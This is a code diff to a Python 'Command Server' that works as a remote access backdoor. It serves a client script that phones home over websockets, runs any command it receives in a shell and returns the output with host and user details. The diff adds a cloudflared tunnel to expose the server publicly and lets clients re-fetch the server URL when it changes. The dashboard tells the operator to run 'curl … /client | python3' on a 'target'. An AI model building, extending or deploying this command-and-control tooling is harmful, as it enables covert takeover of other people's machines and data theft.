@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 """
 Command Server — single-file remote command execution + web dashboard.
+Starts cloudflared automatically and shows the public URL.
 Requires: pip install aiohttp
 Run:      python3 server.py
 """
@@ -11,7 +12,7 @@ import json
 import secrets
 import os
 import sys
-import getpass
+import subprocess
 import time
 from pathlib import Path
 
@@ -27,31 +28,71 @@ BASE = Path(__file__).resolve().parent
 DATA_DIR = BASE / "data"
 DATA_DIR.mkdir(exist_ok=True)
 CLIENTS_FILE = DATA_DIR / "clients.json"
+CONFIG_FILE = DATA_DIR / "config.json"
+
+# ─── LOAD / SAVE CONFIG ───────────────────────────────────────────────────────
+def load_config():
+    if CONFIG_FILE.exists():
+        return json.loads(CONFIG_FILE.read_text())
+    return {"server_url": ""}
+
+def save_config(cfg):
+    CONFIG_FILE.write_text(json.dumps(cfg, indent=2))
+
+config = load_config()
+
+# ─── CLOUDFLARED ──────────────────────────────────────────────────────────────
+def start_cloudflared():
+    """Start cloudflared quick tunnel and extract the URL."""
+    proc = subprocess.Popen(
+        ["cloudflared", "tunnel", "--url", f"http://localhost:{PORT}"],
+        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
+    )
+    url = None
+    for _ in range(30):
+        line = proc.stdout.readline()
+        sys.stdout.write(f"  [cloudflared] {line.strip()}\n")
+        if "trycloudflare.com" in line:
+            url = line.split("https://")[1].split()[0]
+            break
+        if "https://" in line:
+            url = line.split("https://")[1].split()[0]
+            break
+    return proc, url
 
 # ─── CLIENT TEMPLATE ──────────────────────────────────────────────────────────
 CLIENT_TEMPLATE = r'''
 import asyncio, json, os, platform, socket, subprocess, sys, urllib.request, websockets
 
-CLIENT_ID = "__CLIENT_ID__"
-CLIENT_TOKEN = "__CLIENT_TOKEN__"
-SERVER = "__SERVER__"
+SERVER_URL = "__SERVER_URL__"
+
+async def get_current_url():
+    """Fetch the latest server URL from the server itself."""
+    try:
+        req = urllib.request.Request(f"https://{SERVER_URL}/api/config")
+        with urllib.request.urlopen(req, timeout=5) as r:
+            return json.loads(r.read())["server_url"]
+    except Exception:
+        return SERVER_URL
 
 async def main():
     while True:
         try:
-            async with websockets.connect(f"wss://{SERVER}", ssl=False) as ws:
-                await ws.send(json.dumps({{"type": "register", "id": CLIENT_ID, "token": CLIENT_TOKEN,
-                    "info": {{"os": platform.system(), "user": os.environ.get("USER","?"),
+            url = await get_current_url()
+            async with websockets.connect(f"wss://{url}/ws/client") as ws:
+                # Register
+                await ws.send(json.dumps({{"type": "register", "id": "__CLIENT_ID__", "token": "__CLIENT_TOKEN__",
+                    "info": {{"os": platform.system(), "user": os.environ.get("USER", os.environ.get("USERNAME","?")),
                               "host": socket.gethostname(), "arch": platform.machine()}}}}))
                 async for msg in ws:
                     d = json.loads(msg)
                     if d["type"] == "cmd":
                         p = await asyncio.get_event_loop().run_in_executor(
                             None, lambda c=d["cmd"]: subprocess.run(c, shell=True, capture_output=True, text=True, cwd=os.path.expanduser("~")))
-                        await ws.send(json.dumps({{"type": "output", "id": CLIENT_ID, "cmd": d["cmd"],
+                        await ws.send(json.dumps({{"type": "output", "id": "__CLIENT_ID__", "cmd": d["cmd"],
                             "stdout": p.stdout, "stderr": p.stderr, "rc": p.returncode}}))
                     elif d["type"] == "ping":
-                        await ws.send(json.dumps({{"type": "pong", "id": CLIENT_ID}}))
+                        await ws.send(json.dumps({{"type": "pong", "id": "__CLIENT_ID__"}}))
         except Exception:
             await asyncio.sleep(5)
 
@@ -68,11 +109,18 @@ body{background:#0a0a0a;color:#fff;font-family:'Courier New',monospace;min-heigh
 .header h1{color:#0f0;text-shadow:0 0 10px #0f0;font-size:1.4rem}
 .header .status{color:#0f0;font-size:.8rem}
 .container{padding:20px 30px}
+.url-box{margin-bottom:24px;padding:16px 20px;border:1px solid #fff;border-radius:8px;background:#111;display:flex;align-items:center;gap:12px;flex-wrap:wrap}
+.url-box label{color:#fff;font-size:.85rem;white-space:nowrap}
+.url-box input{flex:1;min-width:250px;background:#222;border:1px solid #0f0;color:#0f0;padding:8px 12px;font-family:inherit;font-size:.9rem;border-radius:4px;outline:none}
+.url-box input:focus{box-shadow:0 0 8px rgba(0,255,0,.3)}
+.url-box button{background:#0f0;color:#000;border:none;padding:8px 18px;cursor:pointer;border-radius:4px;font-family:inherit;font-weight:bold;font-size:.85rem}
+.url-box button:hover{box-shadow:0 0 12px #0f0}
+.url-box .saved{color:#0f0;font-size:.75rem;display:none}
 .clients{display:grid;grid-template-columns:repeat(auto-fill,minmax(320px,1fr));gap:16px}
 .card{background:#111;border:1px solid #0f0;border-radius:8px;padding:16px;position:relative;box-shadow:0 0 8px rgba(0,255,0,.15)}
 .card .name{color:#0f0;font-weight:bold;font-size:1.1rem;text-shadow:0 0 6px #0f0}
 .card .meta{color:#aaa;font-size:.75rem;margin-top:6px;line-height:1.6}
-.card .btn{margin-top:12px;padding:6px 14px;background:transparent;border:1px solid #0f0;color:#0f0;cursor:pointer;border-radius:4px;font-family:inherit;font-size:.8rem;transition:all .2s}
+.card .btn{margin-top:12px;margin-right:6px;padding:6px 14px;background:transparent;border:1px solid #0f0;color:#0f0;cursor:pointer;border-radius:4px;font-family:inherit;font-size:.8rem;transition:all .2s}
 .card .btn:hover{background:#0f0;color:#000;box-shadow:0 0 12px #0f0}
 .card .btn.danger{border-color:#f00;color:#f00}
 .card .btn.danger:hover{background:#f00;color:#fff;box-shadow:0 0 12px #f00}
@@ -96,19 +144,29 @@ body{background:#0a0a0a;color:#fff;font-family:'Courier New',monospace;min-heigh
 .rebuild-box{margin-top:30px;padding:20px;border:1px solid #fff;border-radius:8px;background:#111}
 .rebuild-box h3{color:#fff;margin-bottom:12px}
 .rebuild-box code{background:#222;padding:2px 6px;border-radius:3px;color:#0f0;font-size:.85rem}
+.rebuild-box .hint{color:#aaa;font-size:.8rem;margin-bottom:10px}
+.rebuild-box button{padding:6px 14px;background:transparent;border:1px solid #0f0;color:#0f0;cursor:pointer;border-radius:4px;font-family:inherit;font-size:.8rem}
+.rebuild-box button:hover{background:#0f0;color:#000}
+.rebuild-out{margin-top:10px;color:#0f0;font-size:.75rem;white-space:pre-wrap;display:none;background:#000;padding:10px;border-radius:4px}
 </style></head><body>
 <div class="header">
   <h1>⬡ COMMAND SERVER</h1>
   <div class="status" id="status">connecting…</div>
 </div>
 <div class="container">
+  <div class="url-box">
+    <label>Server URL:</label>
+    <input id="url-input" placeholder="your-tunnel.trycloudflare.com">
+    <button onclick="saveUrl()">Save</button>
+    <span class="saved" id="url-saved">✓ saved</span>
+  </div>
   <div class="section-title">Connected Clients</div>
   <div class="clients" id="clients"><div class="empty">No clients connected</div></div>
   <div class="rebuild-box">
     <h3>Generate Client</h3>
-    <p style="color:#aaa;font-size:.8rem;margin-bottom:10px">Run on target: <code>curl -s https://YOUR_SERVER:PORT/client | python3</code></p>
-    <button class="card .btn" onclick="rebuild()">Rebuild Client Script</button>
-    <pre id="rebuild-out" style="margin-top:10px;color:#0f0;font-size:.75rem;white-space:pre-wrap;display:none"></pre>
+    <p class="hint">Run on target (Windows or Linux): <code>curl -s https://YOUR_URL/client | python3</code></p>
+    <button onclick="rebuild()">Generate Client Script</button>
+    <pre class="rebuild-out" id="rebuild-out"></pre>
   </div>
 </div>
 <div class="terminal-overlay" id="term-overlay">
@@ -130,7 +188,12 @@ const termOverlay = document.getElementById('term-overlay');
 const termBody = document.getElementById('term-body');
 const termInput = document.getElementById('term-input');
 const termTitle = document.getElementById('term-title');
+const urlInput = document.getElementById('url-input');
+const urlSaved = document.getElementById('url-saved');
 const rebuildOut = document.getElementById('rebuild-out');
+
+// Load current URL
+fetch('/api/config').then(r=>r.json()).then(d=>{ urlInput.value = d.server_url || ''; });
 
 function connect() {
   ws = new WebSocket(`ws://${location.host}/ws/dashboard`);
@@ -190,6 +253,15 @@ function killClient(id) {
   if (confirm('Kill client ' + id + '?')) ws.send(JSON.stringify({type:'kill', id}));
 }
 
+function saveUrl() {
+  const url = urlInput.value.trim().replace(/^https?:\/\//, '');
+  fetch('/api/config', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({server_url: url})})
+    .then(r=>r.json()).then(d=>{
+      urlSaved.style.display = 'inline';
+      setTimeout(()=>urlSaved.style.display='none', 2000);
+    });
+}
+
 function rebuild() {
   fetch('/api/rebuild').then(r=>r.text()).then(t => {
     rebuildOut.textContent = t;
@@ -197,6 +269,7 @@ function rebuild() {
   });
 }
 
+urlInput.addEventListener('keydown', e => { if (e.key === 'Enter') saveUrl(); });
 termInput.addEventListener('keydown', e => { if (e.key === 'Enter') sendCmd(); });
 connect();
 </script></body></html>'''
@@ -215,16 +288,33 @@ def load_clients():
         for cid, info in data.items():
             clients[cid] = {"token": info["token"], "info": info["info"], "ws": None, "since": 0}
 
+def broadcast():
+    payload = json.dumps({"type": "clients", "clients": [
+        {"id": cid, "info": c["info"], "since": c["since"]} for cid, c in clients.items() if c["ws"]
+    ]})
+    for ws in list(dashboard_ws):
+        asyncio.ensure_future(ws.send_str(payload))
+
 # ─── HANDLERS ─────────────────────────────────────────────────────────────────
 
 async def index(request):
     return web.Response(text=DASHBOARD_HTML, content_type="text/html")
 
+async def api_config_get(request):
+    return web.json_response(config)
+
+async def api_config_post(request):
+    data = await request.json()
+    if "server_url" in data:
+        config["server_url"] = data["server_url"].strip().replace("https://", "").replace("http://", "")
+        save_config(config)
+        print(f"\n  [config] Server URL updated: {config['server_url']}")
+    return web.json_response({"ok": True, "server_url": config["server_url"]})
+
 async def dashboard_ws_handler(request):
     ws = web.WebSocketResponse()
     await ws.prepare(request)
     dashboard_ws.add(ws)
-    # send current state
     await ws.send_json({"type": "clients", "clients": [
         {"id": cid, "info": c["info"], "since": c["since"]} for cid, c in clients.items() if c["ws"]
     ]})
@@ -240,6 +330,7 @@ async def dashboard_ws_handler(request):
                     cid = d["id"]
                     if cid in clients and clients[cid]["ws"]:
                         await clients[cid]["ws"].close()
+                    if cid in clients:
                         del clients[cid]
                     broadcast()
             elif msg.type == WSMsgType.CLOSE:
@@ -247,13 +338,6 @@ async def dashboard_ws_handler(request):
     finally:
         dashboard_ws.discard(ws)
     return ws
-
-def broadcast():
-    payload = json.dumps({"type": "clients", "clients": [
-        {"id": cid, "info": c["info"], "since": c["since"]} for cid, c in clients.items() if c["ws"]
-    ]})
-    for ws in list(dashboard_ws):
-        asyncio.ensure_future(ws.send_str(payload))
 
 async def client_ws_handler(request):
     ws = web.WebSocketResponse()
@@ -280,8 +364,6 @@ async def client_ws_handler(request):
                             await dw.send_json(d)
                         except Exception:
                             pass
-                elif d["type"] == "pong":
-                    pass
             elif msg.type == WSMsgType.CLOSE:
                 break
     finally:
@@ -291,22 +373,21 @@ async def client_ws_handler(request):
     return ws
 
 async def client_download(request):
-    """Serves a one-shot client script (no fixed ID — generates one)."""
     cid = secrets.token_hex(6)
     token = secrets.token_hex(16)
     clients[cid] = {"token": token, "info": {}, "ws": None, "since": 0}
     save_clients()
-    server_host = request.host
-    code = CLIENT_TEMPLATE.replace("__CLIENT_ID__", cid).replace("__CLIENT_TOKEN__", token).replace("__SERVER__", server_host)
+    server_url = config["server_url"] or request.host
+    code = CLIENT_TEMPLATE.replace("__CLIENT_ID__", cid).replace("__CLIENT_TOKEN__", token).replace("__SERVER_URL__", server_url)
     return web.Response(text=code, content_type="text/x-python")
 
 async def api_rebuild(request):
-    """Returns the client download command + a standalone script."""
     cid = secrets.token_hex(6)
     token = secrets.token_hex(16)
     clients[cid] = {"token": token, "info": {}, "ws": None, "since": 0}
     save_clients()
-    code = CLIENT_TEMPLATE.replace("__CLIENT_ID__", cid).replace("__CLIENT_TOKEN__", token).replace("__SERVER__", f"{HOST}:{PORT}")
+    server_url = config["server_url"] or f"localhost:{PORT}"
+    code = CLIENT_TEMPLATE.replace("__CLIENT_ID__", cid).replace("__CLIENT_TOKEN__", token).replace("__SERVER_URL__", server_url)
     return web.Response(text=f"# Client ID: {cid}\n# Save as client.py and run: python3 client.py\n\n{code}", content_type="text/plain")
 
 async def api_clients(request):
@@ -319,11 +400,22 @@ async def api_clients(request):
 
 async def on_startup(app):
     load_clients()
-    print(f"\n  ⬡ Command Server running on http://{HOST}:{PORT}")
-    print(f"  Dashboard: http://localhost:{PORT}")
-    print(f"  Client:    curl -s http://<your-ip>:{PORT}/client | python3\n")
+    print(f"\n  ⬡ Starting cloudflared tunnel…")
+    cf_proc, url = start_cloudflared()
+    if url:
+        config["server_url"] = url
+        save_config(config)
+        print(f"  ✓ Public URL: https://{url}")
+    else:
+        print(f"  ⚠ Could not detect tunnel URL. Set it manually in the dashboard.")
+    print(f"\n  Dashboard: http://localhost:{PORT}")
+    print(f"  Client:    curl -s https://{url or '<your-url>'}/client | python3\n")
+    app["cf_proc"] = cf_proc
 
 async def on_shutdown(app):
+    cf_proc = app.get("cf_proc")
+    if cf_proc:
+        cf_proc.terminate()
     for ws in dashboard_ws:
         await ws.close()
     for c in clients.values():
@@ -340,6 +432,8 @@ def main():
     app.router.add_get("/client", client_download)
     app.router.add_get("/api/rebuild", api_rebuild)
     app.router.add_get("/api/clients", api_clients)
+    app.router.add_get("/api/config", api_config_get)
+    app.router.add_post("/api/config", api_config_post)
     web.run_app(app, host=HOST, port=PORT)
 
 if __name__ == "__main__":
